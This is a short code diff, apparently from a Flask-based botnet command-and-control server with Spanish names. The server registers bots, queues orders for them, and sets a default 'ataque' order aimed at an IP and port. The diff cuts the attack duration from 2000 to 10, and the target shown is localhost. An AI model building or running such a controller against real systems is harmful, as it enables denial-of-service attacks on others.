@@ -11,7 +11,7 @@ app = Flask(__name__)
 bots = {}                 # bots registrados: {bot_id: info}
 ordenes_pendientes = {}   # orden pendiente por bot: {bot_id: {...}}
 
-ORDEN_POR_DEFECTO = {"tipo": "ataque", "parametros": {"ip": "127.0.0.1", "puerto": 80, "duracion": 2000}}
+ORDEN_POR_DEFECTO = {"tipo": "ataque", "parametros": {"ip": "127.0.0.1", "puerto": 80, "duracion": 10}}
 
 @app.route("/registro", methods=["POST"])
 def registro():
